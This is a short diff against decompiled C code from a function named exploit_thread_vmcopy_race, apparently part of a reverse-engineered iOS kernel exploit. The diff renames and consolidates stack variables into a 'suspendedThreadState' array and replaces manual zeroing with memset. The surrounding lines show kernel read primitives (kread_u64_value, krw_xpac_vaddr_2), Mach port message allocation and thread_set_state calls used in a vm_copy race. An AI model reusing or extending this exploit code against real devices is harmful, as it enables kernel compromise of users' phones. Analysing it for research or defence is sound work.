@@ -10619,23 +10619,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1)
   uint64_t v111[6]; // [xsp+108h] [xbp-5F8h] BYREF
   semaphore_t v112; // [xsp+138h] [xbp-5C8h]
   semaphore_t v113; // [xsp+13Ch] [xbp-5C4h]
-  natural_t v114[4]; // [xsp+140h] [xbp-5C0h] BYREF
-  __int128 v115; // [xsp+150h] [xbp-5B0h]
-  __int128 v116; // [xsp+160h] [xbp-5A0h]
-  __int128 v117; // [xsp+170h] [xbp-590h]
-  __int128 v118; // [xsp+180h] [xbp-580h]
-  __int128 v119; // [xsp+190h] [xbp-570h]
-  __int128 v120; // [xsp+1A0h] [xbp-560h]
-  __int128 v121; // [xsp+1B0h] [xbp-550h]
-  __int128 v122; // [xsp+1C0h] [xbp-540h]
-  __int128 v123; // [xsp+1D0h] [xbp-530h]
-  __int128 v124; // [xsp+1E0h] [xbp-520h]
-  __int128 v125; // [xsp+1F0h] [xbp-510h]
-  __int128 v126; // [xsp+200h] [xbp-500h]
-  __int128 v127; // [xsp+210h] [xbp-4F0h]
-  __int128 v128; // [xsp+220h] [xbp-4E0h]
-  __int128 v129; // [xsp+230h] [xbp-4D0h]
-  __int128 v130; // [xsp+240h] [xbp-4C0h]
+  natural_t suspendedThreadState[0x44]; // [xsp+140h] [xbp-5C0h] BYREF
   uint64_t v131[2]; // [xsp+250h] [xbp-4B0h] BYREF
   __int64 (__fastcall *v132)(__int64, unsigned __int8); // [xsp+260h] [xbp-4A0h]
   void *v133; // [xsp+268h] [xbp-498h]
@@ -11021,23 +11005,7 @@ LABEL_68:
     *(uint64_t *)(a1 + 376) = krw_xpac_vaddr_2(v74, v75);
     v76 = send_port_alloc_msg(a1, 0x10000);
     *(uint64_t *)(a1 + 664) = v76;
-    v129 = 0u;
-    v130 = 0u;
-    v127 = 0u;
-    v128 = 0u;
-    v125 = 0u;
-    v126 = 0u;
-    v123 = 0u;
-    v124 = 0u;
-    v121 = 0u;
-    v122 = 0u;
-    v119 = 0u;
-    v120 = 0u;
-    v117 = 0u;
-    v118 = 0u;
-    v115 = 0u;
-    v116 = 0u;
-    *(__int128 *)v114 = 0u;
+    memset(suspendedThreadState, 0, sizeof(suspendedThreadState));
     *(__int128 *)(a1 + 624) = 0u;
     *(__int128 *)(a1 + 640) = 0u;
     *(__int128 *)(a1 + 592) = 0u;
@@ -11074,7 +11042,7 @@ LABEL_68:
     thread_set_state(*(uint32_t *)(a1 + 672), 6, (thread_state_t)(a1 + 384), 0x44u);
     v78 = kread_u64_value(*(uint64_t *)(a1 + 8), v100 + 296);
     memcpy(*(void **)(a1 + 24), __dst, 0x130u);
-    thread_set_state(*(uint32_t *)(a1 + 672), 6, v114, 0x44u);
+    thread_set_state(*(uint32_t *)(a1 + 672), 6, suspendedThreadState, 0x44u);
     kread_u64_value(*(uint64_t *)(a1 + 8), v100 + 296);
     kread_u32_value(*(uint64_t *)(a1 + 8), v101);
     while ( 1 )
